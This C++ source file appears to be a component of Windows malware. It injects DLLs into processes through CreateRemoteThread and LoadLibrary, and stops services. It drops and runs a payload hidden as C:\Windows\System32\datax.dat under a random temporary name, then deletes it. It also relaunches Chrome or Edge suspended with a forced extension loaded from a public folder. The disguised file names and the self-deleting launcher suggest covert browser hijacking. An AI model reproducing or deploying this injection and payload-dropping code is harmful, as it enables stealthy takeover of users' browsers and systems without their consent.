
#include "HookUtil.h"
#include <Psapi.h>
#include <winsvc.h>
#include <tlhelp32.h>
#include <wtypes.h>
#include <stdio.h>
#include <tchar.h>
#include "ProcessUtil.h"

unsigned long checkServiceStatus(const wchar_t* p_wszName)
{
    unsigned long lRet = 0;
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scmHandle == NULL) {
        return 0;
    }

    // Open a handle to the service.
    SC_HANDLE serviceHandle = OpenService(scmHandle, p_wszName, SERVICE_QUERY_STATUS);
    if (serviceHandle == NULL) {
        CloseServiceHandle(scmHandle);
        return 0;
    }

    // Query the service status.
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    if (!QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {

    }
    else {
        if (ssp.dwCurrentState == SERVICE_STOPPED) {
            lRet = -1;
        }
    }

    // Close handles.
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    return lRet;
}
std::wstring stringToWstring(const std::string& str) {
    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(sizeNeeded, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], sizeNeeded);
    return wstr;
}
DWORD GetExplorerPID(std::string	p_sProcessName) {

    std::wstring        w_sFindProcessName = L"";

    if (p_sProcessName.empty()) {
        w_sFindProcessName = L"explorer.exe";
    }
    else {
        w_sFindProcessName = stringToWstring(p_sProcessName);
    }

    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_tcscmp(pe.szExeFile, w_sFindProcessName.c_str()) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

bool StopService(const std::wstring& serviceName) {
    // Open a handle to the Service Control Manager
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scmHandle == NULL) {
        return false;
    }

    // Open a handle to the service
    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName.c_str(), SERVICE_QUERY_STATUS | SERVICE_STOP);
    if (serviceHandle == NULL) {
        CloseServiceHandle(scmHandle);
        return false;
    }

    // Query the service status
    SERVICE_STATUS status;
    if (!QueryServiceStatus(serviceHandle, &status)) {
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        return false;
    }

    // Check if the service is running
    if (status.dwCurrentState == SERVICE_RUNNING) {
        std::wcout << L"Service is running. Attempting to stop it..." << std::endl;

        // Attempt to stop the service
        if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
            CloseServiceHandle(serviceHandle);
            CloseServiceHandle(scmHandle);
            return false;
        }

        // Wait for the service to stop
        DWORD waitTime = 10000; // 10 seconds
        while (QueryServiceStatus(serviceHandle, &status)) {
            if (status.dwCurrentState == SERVICE_STOPPED) {
                break;
            }
            Sleep(1000); // Sleep for 1 second before checking again
            waitTime -= 1000;
            if (waitTime == 0) {
                CloseServiceHandle(serviceHandle);
                CloseServiceHandle(scmHandle);
                return false;
            }
        }
    }
    else {
//        std::wcout << L"Service is not running." << std::endl;
    }

    // Clean up
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    return true;
}
bool UninjectDLL(DWORD processID, const char* dllName) {
    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    //if (!hProcess) return false;

    //HMODULE hMods[1024];
    //DWORD cbNeeded = 0;
    //if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
    //    CloseHandle(hProcess);
    //    return false;
    //}

    //for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
    //    char szModName[MAX_PATH];
    //    if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(char))) {
    //        if (strstr(szModName, dllName)) {
    //            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FreeLibrary, hMods[i], 0, NULL);
    //            if (hThread) {
    //                WaitForSingleObject(hThread, INFINITE);
    //                CloseHandle(hThread);
    //                CloseHandle(hProcess);
    //                return true;
    //            }
    //        }
    //    }
    //}

    //CloseHandle(hProcess);
    return false;
}

bool FindHookDllINExplor(DWORD processID, const char* dllName) 
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (!hProcess) 
        return false;

    HMODULE hMods[1024];
    DWORD cbNeeded = 0;
    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        CloseHandle(hProcess);
        return false;
    }

    for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
        char szModName[MAX_PATH];
        if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(char))) {
            if (strstr(szModName, dllName)) {
                return true;
            }
        }
    }

    CloseHandle(hProcess);
    return false;
}
//
//void InjectDll_SVC(HANDLE p_hProcess, LPCWSTR p_wszDllPath /*= NULL*/) {
//    wchar_t wszDllPath[MAX_PATH]; memset(wszDllPath, 0, sizeof(wszDllPath));
//    wcscpy_s(wszDllPath, MAX_PATH, p_wszDllPath);
//    unsigned int cchDllPath = sizeof(wszDllPath);
//
//    HMODULE hKernel32 = GetModuleHandleA("Kernelbase.dll");
//    FARPROC lb = GetProcAddress(hKernel32, "LoadLibraryW");
//
//    HANDLE hProcess = p_hProcess;
//
//    void* pMem = VirtualAllocEx(hProcess, NULL, cchDllPath, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
//    WriteProcessMemory(hProcess, pMem, wszDllPath, cchDllPath, NULL);
//    HANDLE handle = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lb, pMem, 0, NULL);
//    if (handle) {
//        WaitForSingleObject(handle, INFINITE);
//        CloseHandle(handle);
//    }
//    VirtualFreeEx(hProcess, pMem, 0, MEM_RELEASE);
//}
bool InjectDll_SVC(HANDLE p_hProcess, LPCWSTR p_wszDllPath) {
    if (p_wszDllPath == NULL || p_hProcess == NULL) {
        MyWriteLog("InjectDll_SVC ... Invalid DLL path or process handle.");
        return false;
    }

    wchar_t wszDllPath[MAX_PATH] = { 0 };
    wcscpy_s(wszDllPath, MAX_PATH, p_wszDllPath);
    size_t cchDllPath = (wcslen(wszDllPath) + 1) * sizeof(wchar_t); // Correct size calculation

    // Obtain handle to Kernel32.dll, which is correct for LoadLibraryW
    HMODULE hKernel32 = GetModuleHandleA("Kernelbase.dll");
    if (hKernel32 == NULL) {
        MyWriteLog("InjectDll_SVC ... Failed to get Kernel32 handle. Error: %d", GetLastError());
//x        std::cerr << "Failed to get Kernel32 handle. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Get the address of LoadLibraryW function
    FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        MyWriteLog("InjectDll_SVC ... Failed to get address of LoadLibraryW. Error: %d", GetLastError());
//x        std::cerr << "Failed to get address of LoadLibraryW. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory in the target process
    void* pRemoteMemory = VirtualAllocEx(p_hProcess, NULL, cchDllPath, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteMemory == NULL) {
        MyWriteLog("InjectDll_SVC ... Failed to allocate memory in the target process. Error: %d", GetLastError());
//x        std::cerr << "Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(p_hProcess, pRemoteMemory, wszDllPath, cchDllPath, NULL)) {
        MyWriteLog("InjectDll_SVC ... Failed to write DLL path to target process. Error: %d", GetLastError());
//x        std::cerr << "Failed to write DLL path to target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(p_hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return false;
    }

    // Create a remote thread in the target process to call LoadLibraryW
    HANDLE hThread = CreateRemoteThread(p_hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        MyWriteLog("InjectDll_SVC ... Failed to create remote thread. Error: %d", GetLastError());
//x        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(p_hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return false;
    }

    // Wait for the remote thread to complete
    WaitForSingleObject(hThread, INFINITE);

    MyWriteLog("OK ... InjectDll_SVC");

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(p_hProcess, pRemoteMemory, 0, MEM_RELEASE);

    return true;
}

bool InjectDLL_TOOL(HANDLE hProcess, const char* dllPath) {
    // Allocate memory in the target process for the DLL path
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemotePath) {
        return false;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return false;
    }

    // Get the address of LoadLibraryA
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibraryA) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return false;
    }

    // Create a remote thread to load the DLL
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
    if (!hRemoteThread) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return false;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);

    return true;
}

void	RunAgentExe(char* p_TempPath, std::wstring& p_Opt)
{
    MyWriteLog("RunAgentExe Start");

    TCHAR		w_szParam[MAX_PATH] = L"";
    std::string	w_TempExeName = getRandomString(6);
    w_TempExeName += ".exe";
    w_TempExeName = p_TempPath + w_TempExeName;

    //. 
    ModContentToFile("C:\\Windows\\System32\\datax.dat", w_TempExeName);
    //cmd_sign(w_TempExeName, GD_LOCAL_SIGNTOOL_FILEPATH);

    MyWriteLog("RunAgentExe CopyFileA done");

    std::wstring	w_strTemp = stringToWstring(w_TempExeName);

    if (IsFileExist(w_TempExeName.c_str())) {
        MyWriteLog("RunAgentExe CopyFileA OK");
    }
    else {
        MyWriteLog("RunAgentExe CopyFileA Faild");
    }

    //. Run Temp Hook exe
    swprintf(w_szParam, L"/C %s %s", w_strTemp.c_str(), p_Opt.c_str());
    _execute(L"cmd.exe", w_szParam, 1);

    //. 
    DeleteFileA(w_TempExeName.c_str());
    MyWriteLog("RunAgentExe End");
    return;
}


void restart_browser(TCHAR* p_sProcessName, int p_nOpt)
{
    std::wstring	w_strOpt = L"";
    TCHAR*          targetProcess = p_sProcessName;//L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"; 
    const char*     dllPath = "C:\\Users\\Public\\data\\ntdb.dll";
    TCHAR	        w_szCommand[MAX_PATH] = L"";
    char			wszTempPath[MAX_PATH]; memset(wszTempPath, 0, sizeof(wszTempPath));

    GetTempPathA(MAX_PATH, wszTempPath);
    strcat(wszTempPath, "xtdbf\\");
    CreateDirectoryA(wszTempPath, NULL);

//    swprintf(w_szCommand, L"\"%s\" --new-window \"https://www.bing.com\" --load-extension=\"C:\\Users\\Public\\data\\ext\" --restore-last-session", p_sProcessName);
    swprintf(w_szCommand, L"\"%s\" --load-extension=\"C:\\Users\\Public\\data\\ext\" --restore-last-session", p_sProcessName);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create the target process in suspended state
    if (!CreateProcess((LPWSTR)targetProcess, w_szCommand, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi)) {
        DWORD error = GetLastError();
        return;
    }
    else {
    }

    //. 
    {
        FILE* w_pFile = _tfopen(L"C:\\Users\\Public\\data\\sss.dat", L"wb");
        fclose(w_pFile);
    }
    // Inject the DLL
    MyWriteLog("restart_browser ... InjectDll_SVC start");
    //std::wstring w_sDllPath = charToWstring(dllPath);
    //if (!InjectDll_SVC(pi.hProcess, w_sDllPath.c_str())) {
    //    MyWriteLog("restart_browser ... InjectDll_SVC Faild");
    //    TerminateProcess(pi.hProcess, 1);
    //    return;
    //}
    if (p_nOpt == 0) {
        w_strOpt = L"--browser_chrome";
        RunAgentExe(wszTempPath, w_strOpt);
    }
    else if (p_nOpt == 1) {
        w_strOpt = L"--browser_msedge";
        RunAgentExe(wszTempPath, w_strOpt);

    }


    MyWriteLog("restart_browser ... InjectDll_SVC End");

    // Resume the target process
    ResumeThread(pi.hThread);

    // Close process and thread handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}